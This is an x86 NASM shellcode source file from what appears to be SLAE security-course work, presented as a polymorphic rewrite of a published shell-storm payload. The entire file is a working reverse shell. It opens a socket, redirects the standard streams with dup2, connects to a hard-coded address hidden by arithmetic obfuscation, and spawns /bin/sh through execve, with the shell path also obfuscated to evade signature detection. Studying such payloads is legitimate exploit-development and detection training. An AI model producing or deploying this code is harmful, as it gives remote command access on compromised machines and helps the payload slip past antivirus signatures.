; Filename: poly-838.nasm
; Author: Konstantinos Alexiou
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
; Desc: Polymorphic version of shellcode http://shell-storm.org/shellcode/files/shellcode-838.php 
; Purpose: SLAE
global _start

section .text
_start:

  ; int socketcall(int call, unsigned long *args)
  ; int socket(int domain, int type, int protocol)
  sub edi,edi			
  mul edi
  mov ebx,eax
  push edx			
  add bl,0x1
  push ebx			
  push byte +0x2
  mov ecx,esp			
  mov al,0x66			
  int 0x80		

  ; dup2(int oldfd, int newfd)
  pop ecx			
  push eax			
  pop ebx			
  loop:
  mov al,0x3f			
  int 0x80			

  ; int socketcall(int call, unsigned long *args)
  ; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen)
  sub ecx,0x01			
  jns loop			
  mov edi,0x4549A67		
  sub edi,0x35398E8              
  push edi			
  add edi,0x6629FE83
  push edi
  mov ecx,esp
  push byte +0x10
  push ecx
  push ebx
  mov ecx,esp
  mov al,0x66 			
  int 0x80

  ;execve 
  mov al,0xb		
  push edx	
  mov dword ebx,0x2f2f7368   ;bitswap the bits
  bswap ebx
  push ebx	
  add ebx,0x05F6330f
  sub bl,0xf
  push ebx	
  mov ebx,esp
  sub ecx,ecx
  int 0x80

